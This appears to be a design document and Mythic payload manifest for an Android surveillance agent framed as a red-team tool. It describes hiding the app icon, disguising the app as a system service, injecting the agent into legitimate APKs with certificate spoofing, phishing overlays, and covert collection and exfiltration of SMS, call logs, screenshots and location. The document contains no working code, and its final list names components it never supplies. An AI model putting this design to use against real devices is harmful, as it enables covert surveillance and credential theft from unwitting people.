
# Mythic Mobile Agent Payload Type (Full Manifest \& Design)

```markdown
# Mythic Mobile Agent Payload Type Manifest & Design

## Overview
`mythic_mobile_agent` is a modular, advanced mobile agent payload designed for Android engagements. It supports stealth APK creation, injection into existing apps, robust local encryption and obfuscation, offline data logging with deferred exfiltration, and seamless multi-campaign management via a dedicated mobile C2 dashboard integrated into Mythic.

---

## Directory Layout (Example)

```

mythic_mobile_agent/
├── Dockerfile                      \# Builder container
├── payload_type.json               \# Mythic payload manifest metadata
├── agent_code/
│   ├── core_agent.py               \# Agent core command dispatcher, comms client
│   ├── modules/                   \# Modular feature plugins (overlay, frida, offline_logger)
│   ├── loader/                   \# Minimal APK/loader bootstrap code
│   └── utils/                    \# Encryption, persistence utilities
├── builder/
│   ├── build_apk.py              \# APK builder: stealth + parameters
│   ├── inject_payload.py         \# APK injector/repacker + signing
│   ├── manifest_editor.py       \# Manifest manipulation
│   ├── obfuscator.py            \# Code string encryption \& renaming
│   └── encryptor.py             \# Payload data encryption utilities
├── c2_profiles/
│   ├── fcm_push/                \# Mobile-optimized push comms profile
│   ├── https_beacon/            \# Scriptable HTTPS beacon profile
│   └── dns_covert/              \# DNS fallback profile for stealth
├── extensions/
│   ├── eventing_workflows/       \# Automated workflows for mobile
│   ├── mitre_mapper/             \# ATT\&CK mapping of agent features
│   └── backend_handlers/         \# Offline log ingestion + campaign management
├── mythic_ui_mobile/             \# React components for Mobile C2 Dashboard \& multi-campaign UI
│   ├── Dashboard.jsx
│   ├── BuildWizard.jsx
│   ├── DevicePanel.jsx
│   ├── CampaignManager.jsx
│   └── ArtifactViewer.jsx
└── docs/
├── usage.md                  \# Operator and developer documentation
└── parameters.md             \# Detailed param descriptions

```

---

## payload_type.json

```

{
"name": "mythic_mobile_agent",
"author": "Red Team",
"version": "1.0.0",
"supported_os": ["android"],
"wrapper": "python3",
"description": "Modular Android agent with stealth APK build, injection, offline logging, and multi-campaign C2 support.",
"build_parameters": [
{
"name": "Campaign ID",
"description": "Unique campaign identifier to tag all gathered data",
"type": "string",
"default_value": "default_campaign"
},
{
"name": "C2 Profile",
"description": "Communication profile to use (FCM, HTTPS Beacon, DNS)",
"type": "dropdown",
"allowed_values": ["fcm_push", "https_beacon", "dns_covert"],
"default_value": "https_beacon"
},
{
"name": "App Name",
"description": "Name of the APK as seen on device",
"type": "string",
"default_value": "System Service"
},
{
"name": "Package Name",
"description": "Java package name (unique identifier)",
"type": "string",
"default_value": "com.android.systemservice"
},
{
"name": "Enable Overlay Module",
"description": "Deploy phishing/system overlays capability",
"type": "boolean",
"default_value": true
},
{
"name": "Enable Frida Module",
"description": "Enable dynamic Frida script injection support",
"type": "boolean",
"default_value": true
},
{
"name": "Enable Offline Logging",
"description": "Use persistent offline data storage and deferred exfiltration",
"type": "boolean",
"default_value": true
},
{
"name": "Auto Hide App Icon",
"description": "Hide app icon from launcher to improve stealth",
"type": "boolean",
"default_value": true
},
{
"name": "Encryption Algorithm",
"description": "Encryption cipher to protect payload data and logs",
"type": "dropdown",
"allowed_values": ["AES-256-GCM", "ChaCha20-Poly1305"],
"default_value": "AES-256-GCM"
},
{
"name": "Obfuscation Level",
"description": "Strength of APK string and method obfuscation",
"type": "dropdown",
"allowed_values": ["none", "light", "strong"],
"default_value": "strong"
},
{
"name": "Logging Interval (minutes)",
"description": "Interval for screenshots and social event captures when offline",
"type": "integer",
"default_value": 10
}
],
"docker_image": "mythic_mobile_agent:latest",
"entry_point": "builder/build_apk.py"
}

```

---

## APK Builder (`builder/build_apk.py`) Key Features

- **Parameter-Driven APK Creation:**  
  Uses build parameters from `payload_type.json` influenced by operator inputs (e.g., campaign ID, package/app name, enabled modules).
  
- **Modular APK Components:**  
  Includes optional modules such as:
  - Overlay phishing UI
  - Frida loader
  - Offline logging (with encrypted SQLite or Realm DB)
  
- **Stealth Features:**
  - Auto-hide app icon (remove launcher activity in manifest)
  - Permission auto-grant and runtime request handling
  - Background-only execution model

- **Robust Obfuscation Layers:**
  - String encryption using AES or ChaCha20-Poly1305
  - Method renaming and dummy code injection for anti-disassembly
  - Resource name obfuscation and icon spoofing

- **Swift & Secure Encryption:**
  - Use `cryptography` Python library or integrated libs for AES-256-GCM or ChaCha20-Poly1305
  - Per-device session keys derived from campaign ID + device UUID for:
    - Command payload encryption
    - Offline data log encryption (at rest)

- **Output:**
  - Produces a signed, aligned, and obfuscated APK ready for deployment
  - Optionally outputs debug build and release build variants

---

## APK Injector (`builder/inject_payload.py`) Features

- **APK Upload & Parsing:**  
  Takes legitimate APK to be hijacked, decompiles with `apktool`/`baksmali`

- **Payload Injection:**
  - Injects agent DEX / native libs / frida hooks into victim APK
  - Modifies manifest to request necessary permissions and enable background services

- **Signature Handling:**
  - Supports import of original APK signing keys for resigning (avoiding permission popups)
  - If keys unavailable, employs 'packer' style wrapping and certificate spoofing when possible

- **Fast Obfuscation:**  
  - On injected payload only, applies obfuscation techniques analogous to builder

- **Output:**
  - Recompiled, signed, and zip-aligned APK ready for sideload or dropper deployment

---

## Offline Logging & Deferred Exfiltration (`agent_code/modules/offline_logger/`)

- Persists collected data locally encrypted using configured cipher
- Data Types: Screenshots, call logs, SMS, social app notifications, location pings
- Auto-batch packaging with campaign ID and timestamp filenames
- Deferred upload triggered by network availability sensing (push or beacon restored)
- Secure cleanup and overwrite on successful exfiltration

---

## Multi-Campaign Support & Mobile C2 Dashboard

### Backend & UI

- **Campaign Manager Module** (React `CampaignManager.jsx` + backend logic)
  - Create, manage, and roll out multiple campaigns from a singular C2 dashboard
  - Campaign IDs used as first-class identifiers and metadata tags across all artifacts, logs, and packets
  - Filtering and access control per campaign
  - Campaign-specific build parameter presets and eventing workflows

- **Device & Task Dashboard**
  - Real-time device health/status per campaign
  - Fluent toggling between campaigns and device groups

- **Automation & Reporting**
  - Campaign-level eventing recipes: overlay triggers, offline data flush policies, profile rotations
  - MITRE ATT&CK tagging scoped per campaign for reporting

---

## Installation & Initialization via Mythic CLI

```


# Build or pull Docker image for agent builder

docker build -t mythic_mobile_agent:latest .

# Install the payload type (must be done within mythic-cli environment)

mythic-cli payloadtype install ./mythic_mobile_agent

# Install C2 profiles

mythic-cli c2profile install ./mythic_mobile_agent/c2_profiles/fcm_push
mythic-cli c2profile install ./mythic_mobile_agent/c2_profiles/https_beacon
mythic-cli c2profile install ./mythic_mobile_agent/c2_profiles/dns_covert

# Install UI extension for Mobile Dashboard \& Campaign Manager

mythic-cli ui-extension install ./mythic_mobile_agent/mythic_ui_mobile

```

---

## Real-World Customization Example

Operators can customize:

- Campaign ID `redteam_july2025`
- C2 profile: `fcm_push`
- "System Updater" app name with `com.android.systemupdater`
- Enable overlay (for phishing) and Frida modules
- Encrypt logs and commands with `AES-256-GCM`
- Obfuscation set to `strong`
- Offline logging interval set to 5 minutes

Example Mythic build command using API or UI corresponds to:

```

{
"Campaign ID": "redteam_july2025",
"C2 Profile": "fcm_push",
"App Name": "System Updater",
"Package Name": "com.android.systemupdater",
"Enable Overlay Module": true,
"Enable Frida Module": true,
"Enable Offline Logging": true,
"Auto Hide App Icon": true,
"Encryption Algorithm": "AES-256-GCM",
"Obfuscation Level": "strong",
"Logging Interval (minutes)": 5
}

```

---

## Additional Notes

- Strong encryption with AES-256-GCM or ChaCha20-Poly1305 balances performance and security.
- Obfuscation complexity can be extended with more advanced techniques in `obfuscator.py`.
- Multi-campaign design lets the operator run segmented red team operations, minimizing risk and maximizing auditability.
- Offline logging with deferred, encrypted exfil ensures no loss of intelligence during connectivity lapses.
- All modules comply with Mythic’s modular design philosophy, allowing for extension via CLI and UI without downtime.

- `build_apk.py` core builder functions with encryption calls
- `inject_payload.py` injection and signing flow
- React UI (NextJS)components for campaign management
- Encryption utilities snippet for AES-256-GCM or ChaCha20-Poly1305 integration



